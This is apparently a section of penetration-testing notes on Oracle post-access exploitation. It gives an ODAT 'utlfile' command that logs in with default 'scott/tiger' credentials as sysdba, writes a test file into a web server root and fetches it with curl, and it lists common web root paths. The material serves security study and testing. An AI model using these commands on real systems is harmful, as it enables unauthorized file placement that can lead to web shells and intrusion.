## **Exploitation / Post-Access**

- **File upload (requires web server path knowledge):**
    

`echo "Oracle File Upload Test" > testing.txt ./odat.py utlfile -s <IP> -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt curl -X GET http://<IP>/testing.txt`

- Can upload files to common paths:
    
    - Linux: `/var/www/html`
        
    - Windows: `C:\inetpub\wwwroot`
